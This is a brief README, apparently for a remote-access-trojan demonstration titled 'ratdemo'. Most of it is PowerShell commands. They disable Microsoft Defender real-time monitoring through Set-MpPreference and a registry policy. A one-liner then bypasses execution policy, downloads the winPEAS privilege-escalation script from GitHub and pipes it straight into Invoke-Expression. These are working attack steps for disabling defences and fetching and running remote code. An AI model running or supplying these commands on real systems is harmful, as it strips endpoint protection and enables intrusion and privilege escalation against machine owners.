# ratdemo
Proof of Value

Disable Microsoft Defender

Set-MpPreference -DisableRealtimeMonitoring $true
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force




1. Downloading the winPEAS.ps1 script from its GitHub repository.
2. Executing that script immediately. Run the following script.
   
powershell -Exec ByPass -NoProfile -c "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1') | IEX"
